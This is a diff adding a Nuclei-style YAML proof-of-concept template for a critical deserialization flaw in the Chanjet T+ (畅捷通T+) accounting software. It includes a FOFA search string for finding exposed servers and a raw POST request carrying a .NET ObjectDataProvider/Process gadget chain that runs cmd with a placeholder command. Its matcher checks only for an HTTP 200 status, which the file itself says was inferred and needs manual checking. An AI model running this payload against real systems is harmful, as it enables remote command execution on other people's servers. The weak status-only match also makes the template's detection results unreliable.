@@ -1,0 +1,21 @@
+id: poc-boxsv2ldc6zy78r5
+info:
+  name: 畅捷通T+ RRATableController存在反序列化漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/boxsv2ldc6zy78r5
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: boxsv2ldc6zy78r5
+    fofa: app="畅捷通-TPlus"
+http:
+- raw:
+  - "POST /tplus/ajaxpro/Ufida.T.DI.UIP.RRA.RRATableController,Ufida.T.DI.UIP.ashx?method=GetStoreWarehouseByStore HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36\nContent-Type: application/json\n\n{\n  \"storeID\":{\n    \"__type\":\"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\",\n    \"MethodName\":\"Start\",\n    \"ObjectInstance\":{\n        \"__type\":\"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\",\n        \"StartInfo\": {\n            \"__type\":\"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\",\n            \"FileName\":\"cmd\", \"Arguments\":\"/c 命令\"\n       }\n    }\n  }\n}"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
